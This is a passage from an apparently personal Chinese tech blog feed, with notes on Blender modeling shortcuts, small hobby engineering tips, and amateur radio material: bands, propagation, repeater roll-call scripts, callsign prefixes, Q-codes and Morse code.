id="中心点">中心点</h3><p>每个物体都会有一个中心点,记录物体的信息.</p><p>右上角选项可以选择&quot;仅影响原点&quot;,然后挪动原点和物体的相对位置.</p><p>立方体的原点默认在中心,这个时候伸长是原点向两边伸长的.</p><h3 id="物体移动-轴心点">物体移动,轴心点</h3><p>移动模式下按Ctrl有吸附功能</p><p>轴心点可以变成边界框中心,质心,各自的中心,以及活动元素.活动元素是多选物体时最后被选中的元素.</p><h3 id="局部坐标">局部坐标</h3><p>和世界坐标不一样的,旋转跟着物体转的这么一个坐标.</p><p>如何调用局部坐标?只要按两次坐标轴就可以在全局和局部坐标中切换了.</p><h1>建模篇</h1><p>模型编辑模式:Tab切换物体模式.按Tab同时移动鼠标会进入丙菜单,出现一个物体的好多种模式.</p><p>选择点线面:大键盘123分别对应,默认是点.(鼠标切换那里在左上角),按Shift可以同时选点线面</p><p>鼠标选择:按w快速切换选中规则,框选刷选,etc.框选是b,刷选是c,注意快捷键进入刷选状态时经常出现其他键都按不了,只能刷选,这个时候按住鼠标中键擦除刚刚选中的点,退出按esc或者右键在空白位置</p><p>反选:选中一块点,按ctrl+i反选这个物体其他的所有点<br>按shift可以选择一些不连续的点,按ctrl可以把两个点之间的最短路径连起来.</p><p>选择相连元素:选一个点按L可以选择所有与这个点相连的点(连什么地方要把鼠标走到那里)(是以四边形计算的,有的时候三角面跨不过去,要用鼠标选)</p><p>选择一个圈(环):选择一个点按alt双击想选的环(横向,纵向,etc)</p><p>随机选择:鼠标防选择上随机选择一些点线面</p><p>扩大选择:按ctrl++(小键盘)或ctrl±(小键盘)可以扩大选择范围或者缩小</p><p>透视模式:alt+Z切换,这个时候可以选中背面的点</p><p>点线面操纵:g移动r旋转s缩放</p><p>删除点线面:选择某些东西按x选择删除哪些东西</p><p>删点:点消失了,和点直接相连的边也消失了,和面直接相连的面也消失了<br>删边:边消失了,和面直接相连的面也消失了<br>删面:面消失了</p><p>融并:会删东西,但是剩下的会缝起来,不会出现一个大洞</p><h3 id="面的法向">面的法向</h3><p>到右上角找到面朝向打开即可看到一个面的正反,蓝色是正面红色是反面</p><p>按shift+n,选一下内向就可以转换朝向.</p><p>法线:面法线垂直于面(浅蓝),顶点法线垂直于切线方向(深蓝),拆分法线(浅粉色,用的比较少,游戏开发会自定义法线)</p><h2 id="建模操作">建模操作</h2><p>左侧边栏:笔 标注,注释<br>测量工具:量工件多大的.<br>新建工具:快速拉出来一个新模型</p><p>挤出:先切换到面模式,然后e挤出一个面(挤出并移动)s缩小(这个面),点挤出是一个面(快速挤出是ctrl+右键),线挤出是一个面.注意e是挤出冰移动,撤销的时候注意一下两个面重合<br>挤出流形:避免重复边的问题.<br>沿法线挤出:rt.<br>单独挤出:立方体切片之后选择多个面挤出会连在一起(一起挤出的),然后单独挤出不会出现这种情况,用于做手指</p><p>向内挤出:i(这个不是挤出并移动)</p><p>倒角(把角磨圆):ctrl+B拉出来一个角(边模式),滑动鼠标滚轮增加细分面(更圆滑)</p><p>环切(腰斩):从中间截断整个物体(ctrl+r),滑动滚轮可以增加或者减少段数点一下确定段数,再点一下确定位置,右键可以自动吸附在最中间的地方</p><p>合并:选择两个点,m合并到中间,按距离的意思是如果两个点的距离小于多少就合并.</p><p>断开:v,一个点要有三条边支持,然后断开的时候就是和别的面不粘了.</p><p>填充:alt双击环选一整个环,然后按住f这个面就被封住了.(被填充了)</p><p>右键细分:可以增加一个边.</p><p>切刀:k进入切刀模式,右键或者空格退出,切刀可以把物体切成好多个面.</p><p>桥接:ctrl+E,只有一个物体才能够桥接.两个物体变一个物体用ctrl+j.</p><p>分离:p,先进透视,选中想分离的物体,按p(这个时候一个物体会变成两个物体…)</p><p>三角面转四边面:Alt+J,调整max shape angle(uv图不变)</p><p><strong>尽量不要在物体模式下缩放,在编辑模式下缩放.如果物体模式缩放了,记得应用下这个缩放.</strong></p><h2 id="修改器">修改器</h2><p>好处是不破坏模型,而且可以叠加多个.</p><p>大概就是,有很多个修改器,可以实现不对模型进行改动的前提下进行渲染和建模,方便撤回和调整.</p><h2 id="ps…">ps…</h2><p>Flu的Blender用起来会有电流声…不知道是什么原因,挪动鼠标能听到滋滋滋的声音…现在的显卡都这么猛的吗???还是我电脑要完了???</p><h1>工学</h1><p>也许名字叫电子电路基础…</p><h2 id="断桥铝">断桥铝</h2><p>铝制窗户框,可以隔热.</p><h2 id="焊锡松香配方">焊锡松香配方</h2><p>25%松香溶解到75%的(无水)酒精当中</p><h2 id="胶水">胶水</h2><p>ab胶(丙烯酸基实用性强,用3m 乐泰 天山 回天) 补土 uv胶 502 补鞋胶 油性胶 5800胶水</p><h2 id="安装床帘经验总结">安装床帘经验总结</h2><ol><li>尽量避免在304不锈钢上打孔,非常难开,半天只有一个小眼</li><li>尽量避免在普通钢铁上打孔,尝试使用纸张填充的方法给杆子限位.</li></ol><h2 id="WD-40-替换">WD-40 替换</h2><p>CRC5-56</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;3D打印文件格式有哪些&quot;&gt;3D打印文件格式有哪些?&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;stl&lt;/code&gt; &lt;code&gt;3mf&lt;/code&gt; &lt;code&gt;amf&lt;/code&gt; &lt;code&gt;obj&lt;/code&gt; 等.&lt;/p&gt;
&lt;h2 id=&quot;ref&quot;&gt;ref&lt;/h2&gt;
&lt;</summary>
      
    
    
    
    <category term="TECH" scheme="https://narafluorine.github.io/categories/TECH/"/>
    
    
    <category term="OTH" scheme="https://narafluorine.github.io/tags/OTH/"/>
    
  </entry>
  
  <entry>
    <title>HAM</title>
    <link href="https://narafluorine.github.io/2024/12/02/30003_HAM/"/>
    <id>https://narafluorine.github.io/2024/12/02/30003_HAM/</id>
    <published>2024-12-02T15:21:27.000Z</published>
    <updated>2026-01-08T05:38:14.954Z</updated>
    
    <content type="html"><![CDATA[<p><code>73 DE BG2MJG HPE CUAGN TU E E</code>  </p><p><code>CUGAN</code> (see you again)<br><code>TU</code> (thank you)<br><code>E E</code> (over and out)</p><p>crac 中国无线电协会业余无线电分会<br>crsa 中国无线电运动协会</p><p>大佬说,无线电玩到最后就两个路线:打比赛和玩技术,技术指自制天线自制设备.</p><h2 id="模拟和数字信号"><a href="#模拟和数字信号" class="headerlink" title="模拟和数字信号"></a>模拟和数字信号</h2><p>模拟直接反应数据原始信息,数字会进行编码.<br>典例:模拟(FM,AM),数字(FT8)</p><h2 id="约定俗成的叫法"><a href="#约定俗成的叫法" class="headerlink" title="约定俗成的叫法"></a>约定俗成的叫法</h2><div class="table-container"><table><thead><tr><th>波长</th><th>70cm</th><th>2m</th><th>6m</th><th>10m</th><th>12m</th><th>15m</th><th>17m</th><th>20m</th><th>30m</th><th>40m</th><th>80m</th><th>160m</th></tr></thead><tbody><tr><td>频率(MHz)</td><td>430-440</td><td>144-148</td><td>50-54</td><td>28-29.7</td><td>24.890-24.990</td><td>21-21.450</td><td>18.068-18.168</td><td>14-14.350</td><td>10.100-10.150</td><td>7-7.2</td><td>3.5-3.9</td><td>1.8-2</td></tr></tbody></table></div><h2 id="Webs"><a href="#Webs" class="headerlink" title="Webs"></a>Webs</h2><p><a href="http://www.qrz.cn/home/">呼号查人1(qrz.cn)</a><br><a href="https://www.qrz.com/page/site.html">呼号查人2(qrz.com)</a><br><a href="http://qrzworld.com/">呼号查人3(火腿助手)</a><br><a href="https://lcwo.net/">练习CW</a><br><a href="https://radioid.net/">dmrid,nxdn也一起注册</a><br><a href="https://brandmeister.network/">查dmr的</a>   </p><p><a href="https://testflight.apple.com/join/zQp3HuMs">神秘apple软件</a><br><a href="https://fydeos.com/">神秘操作系统</a>  </p><h1 id="业余无线电波段-A"><a href="#业余无线电波段-A" class="headerlink" title="业余无线电波段(A)"></a>业余无线电波段(A)</h1><p>A证只有三个波段:<br>U段 V段 50-54M</p><h2 id="黄金法则-位置-gt-天线-gt-功率"><a href="#黄金法则-位置-gt-天线-gt-功率" class="headerlink" title="黄金法则:位置&gt;天线&gt;功率"></a>黄金法则:位置&gt;天线&gt;功率</h2><h2 id="如何野架不被当成间谍"><a href="#如何野架不被当成间谍" class="headerlink" title="如何野架不被当成间谍?"></a>如何野架不被当成间谍?</h2><p>买一件中国电信5G的那种工作外套伪装工作人员.<br><img src="../../../../images/hamcloth.jpg" alt="aaa"></p><h2 id="吉林大学前卫南区的梅登海德坐标"><a href="#吉林大学前卫南区的梅登海德坐标" class="headerlink" title="吉林大学前卫南区的梅登海德坐标"></a>吉林大学前卫南区的梅登海德坐标</h2><p><code>PN23pt</code> (末端字母字典序增加时,位置会上移”一个格子”)</p><h1 id="QT-桑的讲座"><a href="#QT-桑的讲座" class="headerlink" title="QT 桑的讲座"></a><code>QT</code> 桑的讲座</h1><h2 id="实际操作小技巧"><a href="#实际操作小技巧" class="headerlink" title="实际操作小技巧"></a>实际操作小技巧</h2><ol><li>先查 MUF （最高可用频率）与 LUF （最低可用频率），选接近MUF 的频率，信号最强。</li><li>使用 DX CIuster 或实时电离层监测网站（如 VOACAP 、 DXMaps ）获取传播数据</li><li>白天尝试高频，夜晚改中低频</li><li>重要比赛或 DX 活动前提前测试不同时间的传播效果</li></ol><h2 id="特殊时段与现象"><a href="#特殊时段与现象" class="headerlink" title="特殊时段与现象"></a>特殊时段与现象</h2><ul><li>黎明/黄昏(Gray Line) 传播：沿晨昏圈传播衰减低，可在低频段获得惊人距离</li><li>太阳黑子极大期：整体电离层电子密度高，白天 MUF 提升，远距离高频段更活跃</li><li>夜间跨赤道传播 (TEP) ：赤道地区电离层异常增强，高频段可长距离通联</li></ul><h2 id="通联策略"><a href="#通联策略" class="headerlink" title="通联策略"></a>通联策略</h2><p>白天</p><ul><li>选择较高频率（接近 MUF 最高可用频率）的短波进行远距离通信 (F2 层反射)</li><li>避免使用过低频率 (D 层吸收严重)</li><li>适合14-28 MHz 波段（ 20m 、 17m 、 15m、 12m 、 10m ）</li><li>高纬度和赤道附近 MUF 最高可用频率可能更高</li></ul><p>夜晚</p><ul><li>选择中低频短波 (F 层仍可反射，但 MUF 最高可用频率降低)</li><li>D 层消失， 3.5-7MHz （ 80m 、 40m ）远距离传播条件改善</li><li>高频短波(&gt;15 MHz) 可能穿透电离层，效果差</li><li>低频段适合跨大洋、跨洲 QSO</li></ul><h2 id="如何利用电离层昼夜变化规律进行远距离通联"><a href="#如何利用电离层昼夜变化规律进行远距离通联" class="headerlink" title="如何利用电离层昼夜变化规律进行远距离通联"></a>如何利用电离层昼夜变化规律进行远距离通联</h2><p>关键在于选择合适的时间和频率，使电波能够被有效反射到目标区域，而不是直接穿透电离层或提前返回地面。</p><div class="table-container"><table><thead><tr><th style="text-align:center">层</th><th style="text-align:center">白天</th><th style="text-align:center">夜晚</th></tr></thead><tbody><tr><td style="text-align:center">D 层</td><td style="text-align:center">电离强、吸收大 $\to$ 抑制低频短波</td><td style="text-align:center">几乎消失 $\to$ 低频短波传播改善</td></tr><tr><td style="text-align:center">E 层</td><td style="text-align:center">白天稳定存在，可反射中低频短波</td><td style="text-align:center">夜晚电离度降低，反射能力变弱</td></tr><tr><td style="text-align:center">F 层</td><td style="text-align:center">白天分为 F1,F2;F2反射高频短波</td><td style="text-align:center">合并为单一 F 层，电子密度降低但寿命长，长距离传播稳定</td></tr></tbody></table></div><h2 id="电离层随季节的变化（北半球）"><a href="#电离层随季节的变化（北半球）" class="headerlink" title="电离层随季节的变化（北半球）"></a>电离层随季节的变化（北半球）</h2><ol><li>春秋（ 3-5 月、 9-11 月）  <ul><li>F2 层电子密度最高， MUF 也处于全年较高水平。  </li><li>传播条件稳定，是全年最佳 DX 季节之一  </li><li>常见跃距：可轻松跨越数千公里。</li></ul></li><li>夏季（ 6-8 月）  <ul><li>D 层吸收增强 $\to$ 低频段(35/7 MHz) 白天传播变差。  </li><li>Sporadic-E (Es 层)活跃 $\to$ VHF (50 MHz) 甚至 UHF 出现长距离传播机会  </li><li>高频段(21-28 MHz) 白天表现良好，夜晚衰减明显。</li></ul></li><li>冬季（ 12-2 月）  <ul><li>夜间 F 层保持较高电子密度 $\to$ 低频段(3.5/7MHz) 长距离传播极佳。  </li><li>高频段 MUF 降低，高于 21 MHz 的波段常常无法进行远程反射。  </li><li>噪声水平低，弱信号接收更容易。</li></ul></li></ol><h2 id="各季节通联技巧"><a href="#各季节通联技巧" class="headerlink" title="各季节通联技巧"></a>各季节通联技巧</h2><p>春秋季：优先选择接近 MUF 的高频段(18-28 MHz) 进行 DX, 传播距离远且信号稳定。<br>夏季:</p><ul><li>白天利用21-28 MHz 高频段；</li><li>关注Es层开通，尝试 50 MHz 通联；</li><li>夜晚改用中低频段(7-14MHz) 。</li></ul><p>冬季:</p><ul><li>低频段(3.5/7 MHz) 夜间长距离通联非常好；</li><li>高频段主要使用14-18 MHz ，尽量避开 21 MHz 以上。<br>全年通用：利用在线 MUF 预测（如 VOACAP 、 DXMaps ）选择频率，并注意太阳活动与电离层状况。</li></ul><h1 id="BR2JCC"><a href="#BR2JCC" class="headerlink" title="BR2JCC"></a>BR2JCC</h1><p>长春本地中继,中继台在五月广场(好像是吾悦广场),晚上十二点左右会关机,凌晨四五点左右会开机.</p><p>439.850-5,亚音88.5<br>-5的意思是下差5kHz.</p><h2 id="说什么"><a href="#说什么" class="headerlink" title="说什么"></a>说什么</h2><p><code>TIME 18:50</code> 左右将会进行晚间点名.</p><h3 id="中继台主持人说"><a href="#中继台主持人说" class="headerlink" title="中继台主持人说"></a>中继台主持人说</h3><p><del>(开始)</del>: 各位在线收听的友台,大家晚上好.今天是2024年11月21日,现在是439.850兆赫, <code>BR2JCC</code> 长春市业余无线电应急中继台台网点名时间.今天由主控台值班员 <code>BG2IEE</code> 主持中继台晚间台网点名活动.使用设备车台小功率发射,QTH是在4G广场附近有参加点名的友台请您依次过来.<del>(注意IEE老师读E不念echo echo念ai fai ko)</del></p><p><del>(回答)</del>: <code>BG2KHY</code> 老朋友晚上好,您是今天第一位参加晚间点名的友台,您使用的设备是车台小功率发射,QTH在百宜会馆,主控台抄收您的信号是59,感谢您对中继台的支持和关注, <code>73</code> <del>(读seventy-three)</del> <code>goodbye</code> 请接下位友台.</p><p><del>(准点报时)</del>: 各位在线守听的友台,现在是439.850兆赫, <code>BR2JCC</code> 长春市业余无线电应急中继台台网点名时间,有参加点名的友台,请您依次过来.</p><p><del>(附带话语)</del>: 还有没有参加点名的友台?</p><p><del>(结束)</del>: 各位在线守听的友台,今日共有23位友台参加了长春市业余无线电应急中继台的晚间台网点名活动,在这里中继台管理团队,感谢大家对中继台的支持和关注,同时也祝439.850兆赫的电波在长春的上空,把美好的祝福,送给所有在线收听的友台,2024年11月21日晚间台网点名结束,下次再会.</p><h3 id="响应中继台说"><a href="#响应中继台说" class="headerlink" title="响应中继台说"></a>响应中继台说</h3><p><code>BG2IE</code> IE老师晚上好,各位在线守听的的友台大家晚上好.这里是 <code>B2/BD6IZI</code> 参加长春市业余无线电业余中继台晚间台网点名活动.我的QTH在吉林大学中心校区,使用手台大功率发射,抄收中继信号59,请问IE老师是否抄收 Over.</p><h3 id="日常CQ呼叫说"><a href="#日常CQ呼叫说" class="headerlink" title="日常CQ呼叫说"></a>日常CQ呼叫说</h3><h3 id="相应CQ呼叫说"><a href="#相应CQ呼叫说" class="headerlink" title="相应CQ呼叫说"></a>相应CQ呼叫说</h3><h2 id="异地发射注意事项"><a href="#异地发射注意事项" class="headerlink" title="异地发射注意事项"></a>异地发射注意事项</h2><p>经群友指出,异地发射在呼号前加上分区的真正原因是告诉大家当前的地理位置,防止有人误认为此电波来自很远很远的地方,造成不必要的麻烦.下面是分区</p><div class="table-container"><table><thead><tr><th style="text-align:left">分区</th><th style="text-align:left">呼号前缀</th><th style="text-align:left">呼号范围</th></tr></thead><tbody><tr><td style="text-align:left">北京(1)</td><td style="text-align:left"><code>B1/</code></td><td style="text-align:left">AA-XZ,AAA-XZZ</td></tr><tr><td style="text-align:left">黑龙江(2)</td><td style="text-align:left"><code>B2/</code></td><td style="text-align:left">AA-HZ,AAA-HZZ</td></tr><tr><td style="text-align:left">吉林(2)</td><td style="text-align:left"><code>B2/</code></td><td style="text-align:left">IA-PZ,IAA-PZZ</td></tr><tr><td style="text-align:left">辽宁(2)</td><td style="text-align:left"><code>B2/</code></td><td style="text-align:left">QA-XZ,QAA-XZZ</td></tr><tr><td style="text-align:left">天津(3)</td><td style="text-align:left"><code>B3/</code></td><td style="text-align:left">AA-FZ,AAA-FZZ</td></tr><tr><td style="text-align:left">内蒙古(3)</td><td style="text-align:left"><code>B3/</code></td><td style="text-align:left">GA-LZ,GAA-LZZ</td></tr><tr><td style="text-align:left">河北(3)</td><td style="text-align:left"><code>B3/</code></td><td style="text-align:left">MA-RZ,MAA-RZZ</td></tr><tr><td style="text-align:left">山西(3)</td><td style="text-align:left"><code>B3/</code></td><td style="text-align:left">SA-XZ,SAA-XZZ</td></tr><tr><td style="text-align:left">上海(4)</td><td style="text-align:left"><code>B4/</code></td><td style="text-align:left">AA-HZ,AAA-HZZ</td></tr><tr><td style="text-align:left">山东(4)</td><td style="text-align:left"><code>B4/</code></td><td style="text-align:left">IA-PZ,IAA-PZZ</td></tr><tr><td style="text-align:left">江苏(4)</td><td style="text-align:left"><code>B4/</code></td><td style="text-align:left">QA-ZZ,QAA-XZZ</td></tr><tr><td style="text-align:left">浙江(5)</td><td style="text-align:left"><code>B5/</code></td><td style="text-align:left">AA-HZ,AAA-HZZ</td></tr><tr><td style="text-align:left">江西(5)</td><td style="text-align:left"><code>B5/</code></td><td style="text-align:left">IA-PZ,IAA-PZZ</td></tr><tr><td style="text-align:left">福建(5)</td><td style="text-align:left"><code>B5/</code></td><td style="text-align:left">QA-ZZ,QAA-XZZ</td></tr><tr><td style="text-align:left">安徽(6)</td><td style="text-align:left"><code>B6/</code></td><td style="text-align:left">AA-HZ,AAA-HZZ</td></tr><tr><td style="text-align:left">河南(6)</td><td style="text-align:left"><code>B6/</code></td><td style="text-align:left">IA-PZ,IAA-PZZ</td></tr><tr><td style="text-align:left">湖北(6)</td><td style="text-align:left"><code>B6/</code></td><td style="text-align:left">QA-ZZ,QAA-XZZ</td></tr><tr><td style="text-align:left">湖南(7)</td><td style="text-align:left"><code>B7/</code></td><td style="text-align:left">AA-HZ,AAA-HZZ</td></tr><tr><td style="text-align:left">广东(7)</td><td style="text-align:left"><code>B7/</code></td><td style="text-align:left">IA-PZ,IAA-PZZ</td></tr><tr><td style="text-align:left">广西(7)</td><td style="text-align:left"><code>B7/</code></td><td style="text-align:left">QA-ZZ,QAA-XZZ</td></tr><tr><td style="text-align:left">海南(7)</td><td style="text-align:left"><code>B7/</code></td><td style="text-align:left">YA-ZZ,YAA-ZZZ</td></tr><tr><td style="text-align:left">四川(8)</td><td style="text-align:left"><code>B8/</code></td><td style="text-align:left">AA-FZ,AAA-FZZ</td></tr><tr><td style="text-align:left">重庆(8)</td><td style="text-align:left"><code>B8/</code></td><td style="text-align:left">GA-LZ,GAA-LZZ</td></tr><tr><td style="text-align:left">贵州(8)</td><td style="text-align:left"><code>B8/</code></td><td style="text-align:left">MA-RZ,MAA-RZZ</td></tr><tr><td style="text-align:left">云南(8)</td><td style="text-align:left"><code>B8/</code></td><td style="text-align:left">SA-XZ,SAA-XZZ</td></tr><tr><td style="text-align:left">陕西(9)</td><td style="text-align:left"><code>B9/</code></td><td style="text-align:left">AA-FZ,AAA-FZZ</td></tr><tr><td style="text-align:left">甘肃(9)</td><td style="text-align:left"><code>B9/</code></td><td style="text-align:left">GA-LZ,GAA-LZZ</td></tr><tr><td style="text-align:left">宁夏(9)</td><td style="text-align:left"><code>B9/</code></td><td style="text-align:left">MA-RZ,MAA-RZZ</td></tr><tr><td style="text-align:left">青海(9)</td><td style="text-align:left"><code>B9/</code></td><td style="text-align:left">SA-XZ,SAA-XZZ</td></tr><tr><td style="text-align:left">新疆(0)</td><td style="text-align:left"><code>B0/</code></td><td style="text-align:left">AA-FZ,AAA-FZZ</td></tr><tr><td style="text-align:left">西藏(0)</td><td style="text-align:left"><code>B0/</code></td><td style="text-align:left">GA-LZ,GAA-LZZ</td></tr><tr><td style="text-align:left">香港</td><td style="text-align:left"><code>VR2/</code></td><td style="text-align:left">VR2</td></tr><tr><td style="text-align:left">澳门</td><td style="text-align:left"><code>XX9/</code></td><td style="text-align:left">XX9</td></tr><tr><td style="text-align:left">台湾</td><td style="text-align:left"><code>BV/</code></td><td style="text-align:left">BV等1-9</td></tr></tbody></table></div><p>注意可能与SOS(求救)或者XXX(紧急信号)TTT(安全信号)一样的可能作为信号的不会使用.<br>BS7H是黄岩岛呼号.</p><p>电台种类:呼号第二个字母 <code>BCEFKSTYZ</code> 备用.<br>卫星业余无线电台(分区是1)和业余信标台呼号是 <code>J</code><br>业余中继台是 <code>R</code><br><code>GHIDA</code> 是能拿到的业余台.</p><h2 id="如何使用cpp发出响声"><a href="#如何使用cpp发出响声" class="headerlink" title="如何使用cpp发出响声?"></a>如何使用cpp发出响声?</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">double</span> pitch=<span class="number">440</span>*<span class="built_in">pow</span>(<span class="number">1.0594631</span>,<span class="number">1</span>);</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">lo</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">Beep</span>(pitch,<span class="number">380</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sh</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">Beep</span>(pitch,<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">lo</span>(),<span class="built_in">sh</span>(),<span class="built_in">lo</span>(),<span class="built_in">sh</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="长春本地"><a href="#长春本地" class="headerlink" title="长春本地"></a>长春本地</h2><p><code>439.850</code> 和 <code>438.500</code><br>cq zone:24<br>itu zone:33  </p><h2 id="邢台本地"><a href="#邢台本地" class="headerlink" title="邢台本地"></a>邢台本地</h2><p>南山公网 邢台密码 439675</p><h2 id="关于卫星"><a href="#关于卫星" class="headerlink" title="关于卫星"></a>关于卫星</h2><p>你要存储5个差距在 $0.05\mathrm{MHz}$ 的频率,对应卫星升降的过程(多普勒效应).<br>目前可以用空间站收SSTV,也可以用空间站打卫星,还可以接收气象卫星的信号.</p><p>然而好像不管多普勒也能直接接收,效果没有差多少.</p><h2 id="卫星云图接收"><a href="#卫星云图接收" class="headerlink" title="卫星云图接收"></a>卫星云图接收</h2><p><a href="https://wxtoimgrestored.xyz/downloads/">WXtoImg(注意该程序最高支持Win8,在Win11下兼容都安装不了,淦)</a><br><a href="https://cdkm.com/cn/cut-audio">剪切音频</a><br><a href="https://online-audio-converter.com/cn/">音频重采样(noaa用采样率11025kHz,单声道的即可)</a><br><a href="https://github.com/martinber/noaa-apt/releases">noaa-apt(Flu用的转换器)</a><br><a href="https://noaa-apt.mbernardi.com.ar/usage.html#program-usage">noaa-apt(官方文档)</a>  </p><h2 id="Q简语"><a href="#Q简语" class="headerlink" title="Q简语"></a>Q简语</h2><div class="table-container"><table><thead><tr><th style="text-align:center">常用Q简语</th><th style="text-align:center">简语问句含义</th><th style="text-align:center">Q简语答句含义</th></tr></thead><tbody><tr><td style="text-align:center">QRA</td><td style="text-align:center">你台名称是什么？</td><td style="text-align:center">我台名称是···</td></tr><tr><td style="text-align:center">QRB</td><td style="text-align:center">你台距离多远？</td><td style="text-align:center">我们相距···</td></tr><tr><td style="text-align:center">QRG</td><td style="text-align:center">我台准确频率是多少？</td><td style="text-align:center">你台准确频率是···</td></tr><tr><td style="text-align:center">QRH</td><td style="text-align:center">我台频率稳定吗？</td><td style="text-align:center">你台频率不稳定</td></tr><tr><td style="text-align:center">QRI</td><td style="text-align:center">我台音调如何？</td><td style="text-align:center">你台音调1良好2不稳3不好</td></tr><tr><td style="text-align:center">QRK</td><td style="text-align:center">我台信号清晰度怎样？</td><td style="text-align:center">你台信号清晰度是1劣2差3可4良5优</td></tr><tr><td style="text-align:center">QRL</td><td style="text-align:center">你台忙吗？</td><td style="text-align:center">我很忙，请不要干扰</td></tr><tr><td style="text-align:center">QRM</td><td style="text-align:center">有旁台干扰吗？</td><td style="text-align:center">有旁台干扰1无2稍有3中等的4严重的5极端的</td></tr><tr><td style="text-align:center">QRN</td><td style="text-align:center">有天电干扰吗？</td><td style="text-align:center">有天电干扰1无2稍有3中等的4严重的5极端的</td></tr><tr><td style="text-align:center">QRO</td><td style="text-align:center">需要增加发射功率吗？</td><td style="text-align:center">需要增加发射功率</td></tr><tr><td style="text-align:center">QRP</td><td style="text-align:center">需要减低发射功率吗？</td><td style="text-align:center">需要减低发射功率</td></tr><tr><td style="text-align:center">QRQ</td><td style="text-align:center">要我发得快点吗？</td><td style="text-align:center">请发得快点（每分钟·.··字）</td></tr><tr><td style="text-align:center">QRS</td><td style="text-align:center">要我发得慢一些吗？</td><td style="text-align:center">请发得慢一些（每分钟··字）</td></tr><tr><td style="text-align:center">QRT</td><td style="text-align:center">要我停止拍发吗？</td><td style="text-align:center">请停止拍发</td></tr><tr><td style="text-align:center">QRU</td><td style="text-align:center">你有和我还有事吗？</td><td style="text-align:center">我和你没事了</td></tr><tr><td style="text-align:center">QRV</td><td style="text-align:center">你准备好了吗？</td><td style="text-align:center">我准备好了</td><td></td></tr><tr><td style="text-align:center">QRW</td><td style="text-align:center">要我转告吗？</td><td style="text-align:center">请转告</td><td></td></tr><tr><td style="text-align:center">QRX</td><td style="text-align:center">你什么时候再呼叫我？</td><td style="text-align:center">我将在···点钟再呼叫你</td></tr><tr><td style="text-align:center">QRZ</td><td style="text-align:center">谁在呼叫我？</td><td style="text-align:center">正用···kHz呼叫你</td></tr><tr><td style="text-align:center">QSA</td><td style="text-align:center">我台信号强度怎样？</td><td style="text-align:center">你台信号强度是1几乎不能收听2弱3还好4好5很好</td></tr><tr><td style="text-align:center">QSB</td><td style="text-align:center">我台信号衰落吗？</td><td style="text-align:center">你台信号有衰落</td></tr><tr><td style="text-align:center">QSD</td><td style="text-align:center">我台信号不完整吗？</td><td style="text-align:center">你台信号不完整</td></tr><tr><td style="text-align:center">QSK</td><td style="text-align:center">在你发信号中间能否收听到我？如果能，我能插入你的发送吗？</td><td style="text-align:center">在我所发信号中间能收听到你，你可以插入我的发送</td></tr><tr><td style="text-align:center">QSL</td><td style="text-align:center">确认通联？</td><td style="text-align:center">确认通联</td></tr><tr><td style="text-align:center">QSN</td><td style="text-align:center">你在···kHz（或MHz）上听到我吗？</td><td style="text-align:center">我已在··kHz（或MHz）上听到你</td></tr><tr><td style="text-align:center">QSO</td><td style="text-align:center">你能通联xx？</td><td style="text-align:center">我能直接通联xx</td></tr><tr><td style="text-align:center">QSP</td><td style="text-align:center">你能传信到xx吗？</td><td style="text-align:center">我能传信到···</td></tr><tr><td style="text-align:center">QSU</td><td style="text-align:center"></td><td style="text-align:center">在此频率上回复</td></tr><tr><td style="text-align:center">QSV</td><td style="text-align:center"></td><td style="text-align:center">在此频率上发送一串V用于测试</td></tr><tr><td style="text-align:center">QSW</td><td style="text-align:center"></td><td style="text-align:center">在此频率上发送</td></tr><tr><td style="text-align:center">QSX</td><td style="text-align:center"></td><td style="text-align:center">在此频率收听</td></tr><tr><td style="text-align:center">QSY</td><td style="text-align:center">需要改变频率吗？</td><td style="text-align:center">请改变频率到xx</td></tr><tr><td style="text-align:center">QSZ</td><td style="text-align:center">需要我拍发两遍吗？</td><td style="text-align:center">请发两遍</td></tr><tr><td style="text-align:center">QTH</td><td style="text-align:center">你台位置？</td><td style="text-align:center">我台位置xx</td><td></td></tr><tr><td style="text-align:center">QTR</td><td style="text-align:center">现在的标准时间？</td><td style="text-align:center">现在的标准时间···</td></tr></tbody></table></div><h2 id="摩斯电码表以及称呼"><a href="#摩斯电码表以及称呼" class="headerlink" title="摩斯电码表以及称呼"></a>摩斯电码表以及称呼</h2><p>首先,短的 <code>.</code> 读 <code>嘀</code> ,长的 <code>-</code> 读 <code>嗒</code> .</p><div class="table-container"><table><thead><tr><th style="text-align:left">Character</th><th style="text-align:left">Morse Code</th><th style="text-align:left">Telephony</th><th style="text-align:left">Phonic</th></tr></thead><tbody><tr><td style="text-align:left"><code>A</code></td><td style="text-align:left"><code>.-</code></td><td style="text-align:left">Alfa</td><td style="text-align:left">(AL-FAH)</td></tr><tr><td style="text-align:left"><code>B</code></td><td style="text-align:left"><code>-...</code></td><td style="text-align:left">Bravo</td><td style="text-align:left">(BRAH-VOH)</td></tr><tr><td style="text-align:left"><code>C</code></td><td style="text-align:left"><code>-.-.</code></td><td style="text-align:left">Charlie</td><td style="text-align:left">(CHAR-LEE)or(SHAR-LEE)</td></tr><tr><td style="text-align:left"><code>D</code></td><td style="text-align:left"><code>-..</code></td><td style="text-align:left">Delta</td><td 